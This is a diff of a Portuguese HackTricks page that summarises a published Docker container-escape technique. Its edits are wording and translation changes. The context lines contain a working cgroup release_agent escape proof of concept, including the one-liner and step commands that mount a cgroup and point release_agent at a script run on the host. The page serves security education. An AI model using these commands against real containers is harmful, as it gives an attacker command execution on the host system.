@@ -10,7 +10,7 @@ Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data
 
 * Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
 * **Junte-se ao** 💬 [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Compartilhe truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.
+* **Compartilhe truques de hacking enviando PRs para os repositórios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
 {% endhint %}
@@ -18,7 +18,7 @@ Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data
 
 **Para mais detalhes, consulte o** [**post original do blog**](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)**.** Este é apenas um resumo:
 
-Original PoC:
+PoC original:
 ```shell
 d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
 mkdir -p $d/w;echo 1 >$d/w/notify_on_release
@@ -29,7 +29,7 @@ $1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
 A prova de conceito (PoC) demonstra um método para explorar cgroups criando um arquivo `release_agent` e acionando sua invocação para executar comandos arbitrários no host do contêiner. Aqui está uma divisão dos passos envolvidos:
 
 1. **Preparar o Ambiente:**
-* Um diretório `/tmp/cgrp` é criado para servir como um ponto de montagem para o cgroup.
+* Um diretório `/tmp/cgrp` é criado para servir como ponto de montagem para o cgroup.
 * O controlador de cgroup RDMA é montado neste diretório. Em caso de ausência do controlador RDMA, sugere-se usar o controlador de cgroup `memory` como alternativa.
 ```shell
 mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
@@ -40,7 +40,7 @@ mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
 ```shell
 echo 1 > /tmp/cgrp/x/notify_on_release
 ```
-3. **Configurar o Release Agent:**
+3. **Configurar o Agente de Liberação:**
 * O caminho do contêiner no host é obtido a partir do arquivo /etc/mtab.
 * O arquivo release\_agent do cgroup é então configurado para executar um script chamado /cmd localizado no caminho do host adquirido.
 ```shell
@@ -66,11 +66,11 @@ Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data
 
 <details>
 
-<summary>Support HackTricks</summary>
+<summary>Supporte o HackTricks</summary>
 
 * Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
 * **Junte-se ao** 💬 [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Compartilhe truques de hacking enviando PRs para os repositórios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* **Compartilhe truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.
 
 </details>
 {% endhint %}
